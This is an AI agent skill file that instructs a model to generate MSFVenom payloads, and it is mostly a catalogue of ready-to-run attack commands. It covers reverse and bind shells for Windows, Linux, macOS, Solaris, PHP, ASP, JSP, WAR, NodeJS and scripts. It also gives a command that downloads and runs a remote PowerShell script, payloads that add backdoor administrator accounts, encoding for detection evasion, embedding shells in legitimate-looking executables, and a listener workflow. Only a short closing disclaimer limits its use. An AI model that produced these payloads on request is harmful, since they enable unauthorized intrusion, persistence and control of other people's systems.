---
name: msfvenom-payloads
description: Generate MSFVenom payloads for penetration testing and security research. Use this skill whenever the user needs to create reverse shells, bind shells, or other payloads for Windows, Linux, macOS, web applications (PHP, ASP, JSP, WAR), or script languages (Python, Perl, Bash). Trigger on requests for payload generation, shellcode creation, meterpreter payloads, or any MSFVenom command construction. Also use when users mention LHOST, LPORT, payload formats, or need to embed payloads in executables.
---

# MSFVenom Payload Generator

A skill for generating MSFVenom commands and payloads for security testing and research.

## When to Use This Skill

Use this skill when:
- Creating reverse shells or bind shells for any platform
- Generating payloads for web applications (PHP, ASP, JSP, WAR, NodeJS)
- Creating script-based payloads (Python, Perl, Bash)
- Needing to encode or obfuscate shellcode
- Embedding payloads in existing executables
- Creating payloads with specific architectures or platforms
- Needing to add users or execute commands via payloads

## Basic Command Structure

```bash
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE_COUNT> LHOST=<IP> LPORT=<PORT>
```

### Key Parameters

| Parameter | Description |
|-----------|-------------|
| `-p` | Payload type |
| `-e` | Encoder (e.g., `shikata_ga_nai`) |
| `-f` | Output format (exe, elf, macho, raw, etc.) |
| `-i` | Number of encoding iterations |
| `-a` | Architecture (x86, x64) |
| `--platform` | Target platform (Windows, Linux, Solaris) |
| `LHOST` | Attacker's IP address |
| `LPORT` | Attacker's listening port |
| `RHOST` | Target IP (for bind shells) |
| `-b` | Bad characters to avoid (e.g., `"\x00\x0a\x0d"`) |
| `-x` | Template executable to embed payload in |
| `-o` | Output filename |

## Listing Available Options

```bash
msfvenom -l payloads    # List all available payloads
msfvenom -l encoders    # List all available encoders
```

## Windows Payloads

### Reverse Meterpreter Shell

**Use when:** You need a full-featured reverse shell with meterpreter capabilities.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > reverse.exe
```

**Example:**
- Input: "Create a Windows reverse meterpreter shell to 192.168.1.100 on port 4444"
- Output: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > reverse.exe`

### Bind Meterpreter Shell

**Use when:** You need the target to listen for incoming connections.

```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f exe > bind.exe
```

### CMD Reverse Shell

**Use when:** You need a basic command shell instead of meterpreter.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > prompt.exe
```

### Create Local User

**Use when:** You need to create a persistent backdoor user account.

```bash
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
```

**Example:**
- Input: "Create a payload that adds user 'admin' with password 'SecurePass123'"
- Output: `msfvenom -p windows/adduser USER=admin PASS=SecurePass123 -f exe > adduser.exe`

### Execute Commands

**Use when:** You need to run specific commands on the target.

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="<COMMAND>" -f exe > payload.exe
```

**Examples:**

```bash
# Download and execute PowerShell script
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<IP>/nishang.ps1')\"" -f exe > pay.exe

# Add user to administrators group
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators <USERNAME> /add" -f exe > pay.exe
```

### Encoded Payloads

**Use when:** You need to evade basic detection or avoid bad characters.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

### Embed in Existing Executable

**Use when:** You need to hide the payload inside a legitimate-looking executable.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x <TEMPLATE_EXE> -f exe -o <OUTPUT_EXE>
```

**Example:**
- Input: "Embed a reverse shell in plink.exe pointing to 10.0.0.5:8080"
- Output: `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=8080 -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe`

## Linux Payloads

### Reverse Meterpreter Shell (x86)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > reverse.elf
```

### Reverse Shell (x64)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > shell.elf
```

### Bind Shell (x86)

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f elf > bind.elf
```

## macOS Payloads

### Reverse Shell

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f macho > reverse.macho
```

### Bind Shell

```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f macho > bind.macho
```

## Solaris (SunOS) Payloads

```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

## Web Application Payloads

### PHP Reverse Shell

**Use when:** Target has PHP execution capability.

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

**Alternative (single command):**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f php > shell.php
```

### ASP/ASPX Reverse Shell

**Use when:** Target is a Windows server with IIS.

```bash
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f asp > reverse.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > reverse.aspx
```

### JSP Reverse Shell

**Use when:** Target is a Java application server.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.jsp
```

### WAR File

**Use when:** You need to deploy a payload as a Java web application.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > reverse.war
```

### NodeJS Reverse Shell

**Use when:** Target runs NodeJS applications.

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.js
```

## Script Language Payloads

### Perl Reverse Shell

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.pl
```

### Python Reverse Shell

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.py
```

### Bash Reverse Shell

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.sh
```

## Common Shellcode Parameters

When creating shellcode for exploitation:

```bash
-b "\x00\x0a\x0d"           # Bad characters to avoid
-f c                        # C format for shellcode
-e x86/shikata_ga_nai       # Encoder
-i 5                        # Encode iterations
EXITFUNC=thread            # Exit function type
PrependSetuid=True         # Execute with SUID privileges
```

## Quick Reference Table

| Platform | Payload | Format | Command |
|----------|---------|--------|--------|
| Windows | Meterpreter Reverse | exe | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe` |
| Windows | CMD Reverse | exe | `msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe` |
| Linux x86 | Meterpreter Reverse | elf | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > payload.elf` |
| Linux x64 | Shell Reverse | elf | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > payload.elf` |
| macOS | Shell Reverse | macho | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > payload.macho` |
| PHP | Meterpreter Reverse | php | `msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f php > payload.php` |
| JSP | Shell Reverse | raw | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > payload.jsp` |
| Python | Shell Reverse | raw | `msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > payload.py` |

## Best Practices

1. **Always specify LHOST and LPORT** - These are required for reverse shells
2. **Use appropriate format** - Match the format to the target environment
3. **Consider encoding** - Use encoders when evasion is needed
4. **Test in isolated environments** - Never test payloads on production systems
5. **Document your payloads** - Keep track of what you've created and where
6. **Use bind shells carefully** - They require the target to be accessible

## Next Steps After Payload Generation

1. **Start a listener** in Metasploit:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD <same_payload_as_generated>
   set LHOST <your_ip>
   set LPORT <your_port>
   exploit
   ```

2. **Transfer the payload** to the target system

3. **Execute the payload** on the target

4. **Handle the connection** when it comes back

## Important Notes

- This skill is for **authorized security testing and research only**
- Always have proper authorization before testing any system
- Understand the legal implications in your jurisdiction
- Use responsibly and ethically
